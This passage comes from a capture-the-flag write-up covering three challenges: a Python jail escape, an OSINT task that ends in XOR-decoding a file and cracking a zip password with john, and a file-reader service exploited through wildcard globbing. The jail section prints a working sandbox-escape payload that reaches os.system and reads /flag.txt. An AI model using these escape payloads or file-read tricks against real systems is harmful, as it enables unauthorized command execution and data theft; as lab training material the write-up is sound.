  File "/app/jailbreak.py", line 28, in <module>
    main()
  File "/app/jailbreak.py", line 25, in main
    exec(text, {'globals': globals(), '__builtins__': {}}, {'print':print})
  File "<string>", line 1
    print "lul too old"
          ^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print("lul too old")?
```

Trying the typical python jail escape route, we can start looking for subclasses/their builtins that we can access to try to get the banned functionality back.

```
for x in ().__class__.__bases__[0].__subclasses__(): print(x.__name__)
```

We can examine the set of subclasses under the tuple `()` object which we are able to use here.

```python
>>> for x in ().__class__.__bases__[0].__subclasses__(): print(x.__name__)
type
weakref
weakcallableproxy
weakproxy
int
bytearray
bytes
list
NoneType
NotImplementedType
traceback
super
range
dict
dict_keys
dict_values
dict_items
dict_reversekeyiterator
dict_reversevalueiterator
dict_reverseitemiterator
odict_iterator
set
str
slice
staticmethod
complex
float
frozenset
property
managedbuffer
memoryview
tuple
enumerate
reversed
stderrprinter
code
frame
builtin_function_or_method
method
function
mappingproxy
generator
getset_descriptor
wrapper_descriptor
method-wrapper
ellipsis
member_descriptor
SimpleNamespace
PyCapsule
longrange_iterator
cell
instancemethod
classmethod_descriptor
method_descriptor
callable_iterator
iterator
PickleBuffer
coroutine
coroutine_wrapper
InterpreterID
EncodingMap
fieldnameiterator
formatteriterator
BaseException
hamt
hamt_array_node
hamt_bitmap_node
hamt_collision_node
keys
values
items
Context
ContextVar
Token
MISSING
moduledef
module
filter
map
zip
_ModuleLock
_DummyModuleLock
_ModuleLockManager
ModuleSpec
BuiltinImporter
classmethod
FrozenImporter
_ImportLockContext
_localdummy
_local
lock
RLock
WindowsRegistryFinder
_LoaderBasics
FileLoader
_NamespacePath
_NamespaceLoader
PathFinder
FileFinder
_IOBase
_BytesIOBuffer
IncrementalNewlineDecoder
ScandirIterator
DirEntry
zipimporter
_ZipImportResourceReader
Codec
IncrementalEncoder
IncrementalDecoder
StreamReaderWriter
StreamRecoder
_abc_data
ABC
dict_itemiterator
Hashable
Awaitable
AsyncIterable
async_generator
Iterable
bytes_iterator
bytearray_iterator
dict_keyiterator
dict_valueiterator
list_iterator
list_reverseiterator
range_iterator
set_iterator
str_iterator
tuple_iterator
Sized
Container
Callable
_wrap_close
Quitter
_Printer
_Helper
DynamicClassAttribute
_GeneratorWrapper
auto
Enum
Pattern
Match
SRE_Scanner
State
SubPattern
Tokenizer
itemgetter
attrgetter
methodcaller
accumulate
combinations
combinations_with_replacement
cycle
dropwhile
takewhile
islice
starmap
chain
compress
filterfalse
count
zip_longest
permutations
product
repeat
groupby
_grouper
_tee
_tee_dataobject
Repr
deque
_deque_iterator
_deque_reverse_iterator
_tuplegetter
_Link
partial
_lru_cache_wrapper
partial
partialmethod
singledispatchmethod
cached_property
Scanner
```

[_frozen_importlib_external.FileLoader](https://docs.python.org/3/library/importlib.html) seemed interesting to me, so I grabbed that one to drill down to see which builtins are there:

```python
>>> print(().__class__.__bases__[0].__subclasses__()[94])
<class '_frozen_importlib_external.FileLoader'>

>>> print(().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__["__builtins__"])
{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2019 Python Software Foundation.
All Rights Reserved.

Copyright (c) 2000 BeOpen.com.
All Rights Reserved.

Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.

Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}
```

So, now we have a `dict` object of the included builtins. Asute minds will notice we now can get access to that there `__import__` built-in now:

```python
>>> print((().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__["__builtins__"])["__im"+"port__"])
<built-in function __import__>

>>> print((().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__["__builtins__"])["__im"+"port__"]("o"+"s"))
<module 'os' from '/usr/lib/python3.8/os.py'>
```

Ok, progress. Now we just need to be able to call `system` under that, so that we can `__import["os"].system("ls")`, etc...


We can acccess the `system` module by going into the `os` module now that we have it:

```python
print((().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__["__builtins__"])["__im"+"port__"]("o"+"s").__dict__["sy"+"stem"])
<built-in function system>
```

Sweet! We have it. Now we can execute arbitrary command line args.

```python
>>> print((().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__["__builtins__"])["__im"+"port__"]("o"+"s").__dict__["sy"+"stem"]("ls /"))
app
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
0
```

`/flag.txt` looks to be what we want!

```python
>>> print((().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__["__builtins__"])["__im"+"port__"]("o"+"s").__dict__["sy"+"stem"]("cat /flag.txt"))
flag{l3t's_try_sc0p1ng_th1s_0ne_2390098}
0
```

Flag is `flag{l3t's_try_sc0p1ng_th1s_0ne_2390098}`.

### 0x414141
> I think offshift promised to opensource some of their code
>
> author: **notforsale**

So, no attached file, no extra clues, and misc. category:

![](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fsimpleskincarescience.com%2Fwp-content%2Fuploads%2F2016%2F09%2Fmr-crabs-smelly-e1540983371963.jpg&f=1&nofb=1)

_Definitely smells like OSINT to me_.

So, I searched github for "offshit" and then realized I missed the f and started looking at the three Github users, since that was the narrowest field:

{{< image src="/img/0x414141_2021/offshift_users.png" alt="offshift_users.png" position="center" style="border-radius: 8px;" >}}

Of these:

* `offshift` has nothing
* `offshift-dev` seems like their legitimate site
* `offshift-protocol` has only one repo called "promo" with just two commits.

Based on this, pretty safe to assume it's the last one we're interested in.

We can nab that repo and look at the very brief history, as it seems we are going to need to work with a suspiciously deleted `__pycache__/script.cpython-38.pyc` file (though, not _too_ suspicious, since that's a garbage file that shouldn't be in there anyways. **But**, this is not a real repo and to clean up stuff that is totally otherwise unrelated to the project seems _fishy_).

```
git clone git@github.com:offshift-protocol/promo.git
cd promo
git checkout dc43c1ac33f767a7d30dbeab123a1c87566e885d
```

Now, we see we have our `__pycache__` folder along with the compiled python byte code that we'll want to try to uncompi(y)le:

```bash
file __pycache__/script.cpython-38.pyc
__pycache__/script.cpython-38.pyc: data
```

I use [uncompyle6](https://github.com/rocky/python-uncompyle6) for this, and it works very well if you have the correct Python version, and are attempting to uncompile the proper versions as well.

```bash
pip install uncompyle6
```
and then:

```python
uncompyle6 script.cpython-38.pyc
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.7.4 (default, Jan 26 2021, 15:49:11)
# [Clang 11.0.3 (clang-1103.0.32.59)]
# Embedded file name: ./script.py
# Compiled at: 2020-12-12 08:17:01
# Size of source mod 2**32: 481 bytes
import base64
secret = 'https://google.com'
cipher2 = [b'NDE=', b'NTM=', b'NTM=', b'NDk=', b'NTA=', b'MTIz', b'MTEw', b'MTEw', b'MzI=', b'NTE=', b'MzQ=', b'NDE=', b'NDA=', b'NTU=', b'MzY=', b'MTEx', b'NDA=', b'NTA=', b'MTEw', b'NDY=', b'MTI=', b'NDU=', b'MTE2', b'MTIw']
cipher1 = [base64.b64encode(str(ord(i) ^ 65).encode()) for i in secret]
# okay decompiling script.cpython-38.pyc
```

Ok, so we can see the source code of that byte code now. `cipher2` seems suspicious, since there is otherwise no method of generation/usage/etc in the file (whereas cipher1 is the google value).

That's simple enough to reverse, assuming the same logic was used to generate that one as the one in cipher1:

```
>>> from base64 import b64decode
>>> cipher2 = [b'NDE=', b'NTM=', b'NTM=', b'NDk=', b'NTA=', b'MTIz', b'MTEw', b'MTEw', b'MzI=', b'NTE=', b'MzQ=', b'NDE=', b'NDA=', b'NTU=', b'MzY=', b'MTEx', b'NDA=', b'NTA=', b'MTEw', b'NDY=', b'MTI=', b'NDU=', b'MTE2', b'MTIw']
>>> for char in cipher2:
...   print(chr(int(b64decode(char).decode())^65), end="")
...
https://archive.is/oMl59
```

So, we got a url link, ok:

{{< image src="/img/0x414141_2021/sketchy_shit.png" alt="sketchy_shit.png" position="center" style="border-radius: 8px;" >}}


In here, we get a sketch link to https://mega.nz/file/AAdDyIoB#gpj5s9N9-VnbNhSdkJ24Yyq3BWSYimoxanP-p03gQWs which is a file called "smashing.pdf". Airquotes because I'm not going to open a random PDF file off some archived message board through an anon link.

If we check that file after downloading it:

```bash
file smashing.pdf
smashing.pdf: data

hexdump -C smashing.pdf| head -n2
00000000  64 11 05 07 6c 70 6f 75  4b 64 82 e5 82 fd 82 f7  |d...lpouKd......|
00000010  82 de 4b 73 61 71 61 2e  23 2b 4b 7d 7d 6e 0d 24  |..Ksaqa.#+K}}n.$|
```

We can see the file is definitely not a PDF. Maybe it is a PDF, but it was just "scrambled" with some XOR? Trying `xortool` on a whim, and then grep'ing for our flag text yields some interesting results:

```
xortool -b ../../smashing.pdf
The most probable key lengths:
 1:  25.0%
10:  19.3%
20:  12.6%
28:   8.0%
30:   8.1%
32:   6.9%
40:   6.1%
42:   5.0%
44:   4.8%
50:   4.4%
Key-length can be 4*n
256 possible key(s) of length 1:
q
p
s
r
u
...
Found 0 plaintexts with 95%+ valid characters
See files filename-key.csv, filename-char_used-perc_valid.csv

grep -r flag xortool_out
Binary file xortool_out/048.out matches
```

Hm, ok, what are you Mr. `xortool_out/048.out`?:

```
file xortool_out/048.out
xortool_out/048.out: PDF document, version 1.4
```

So, supposedly, that is a PDF file. Though again, still not going to just rename it to PDF and open it.

`binwalk` is what I used to check:

```bash
binwalk xortool_out/048.out

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.4"
71            0x47            Zlib compressed data, default compression
4611          0x1203          Zlib compressed data, default compression
10567         0x2947          Zlib compressed data, default compression
15242         0x3B8A          Zlib compressed data, default compression
20557         0x504D          Zlib compressed data, default compression
25221         0x6285          Zlib compressed data, default compression
29628         0x73BC          Zlib compressed data, default compression
33343         0x823F          Zlib compressed data, default compression
35866         0x8C1A          Zlib compressed data, default compression
37667         0x9323          Zlib compressed data, default compression
56639         0xDD3F          Zlib compressed data, default compression
57534         0xE0BE          Zlib compressed data, default compression
79741         0x1377D         Zlib compressed data, default compression
80621         0x13AED         Zlib compressed data, default compression
82408         0x141E8         Zlib compressed data, default compression
83001         0x14439         Zlib compressed data, default compression
104201        0x19709         Zlib compressed data, default compression
105108        0x19A94         Zlib compressed data, default compression
143957        0x23255         Zlib compressed data, default compression
145057        0x236A1         Zlib compressed data, default compression
166900        0x28BF4         Zlib compressed data, default compression
167748        0x28F44         Zlib compressed data, default compression
180354        0x2C082         Zlib compressed data, default compression
184292        0x2CFE4         Zip archive data, encrypted at least v1.0 to extract, compressed size: 65, uncompressed size: 53, name: flag.txt
184517        0x2D0C5         End of Zip archive, footer length: 22
```

Looky looky, a zip containing our flag. Billion dollars says it's going to be password protected. We can extract and check like so:

```
binwalk --dd=".*" xortool_out/048.pdf --directory binwalk_out

 7z e binwalk_out/_048.pdf.extracted/2CFE4.zip
```

And what do you know, there is a password:)

`zip2john` --> `hashcat` / `john` -> flag.

```
zip2john binwalk_out/_048.pdf.extracted/2CFE4.zip > ziphash

john --wordlist=rockyou.txt ziphash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
passwd           (2CFE4.zip)
1g 0:00:00:00 DONE (2021-01-26 16:05) 50.00g/s 4096Kp/s 4096Kc/s 4096KC/s rossoneri..janiece
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Our password is `passwd`; entering that for `7z` and we get our flag:

```
cat flag.txt
oh ma gawd you got it

flag{1t_b33n_A_l0ng_w@y8742}
```

Flag is `flag{1t_b33n_A_l0ng_w@y8742}`.

### file reader
> hello guys, I started this new service check note.txt file for a sanity check
>
> `207.180.200.166 2324`

Connecting to the endpoint, it seems to just cat whatever command is typed in:

```
nc 207.180.200.166 2324
give me a file to read
> note.txt
hello

we are so happy that ,you are using our service.
```

Testing a quick wildcard pattern:

```bash
nc 207.180.200.166 2324
give me a file to read
> .*
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
...
```

Uh-oh, not good for them. We can just use a wildcard to get every file in a directory output. Starting from the root directory, I guess that flag was probably in a txt file, lo'and behold:

```bash
nc 207.180.200.166 2324
give me a file to read
> /*.txt
flag{oof_1t_g0t_expanded_93929}
```

Flag is `flag{oof_1t_g0t_expanded_93929}`. Didn't even need to look at the source:)
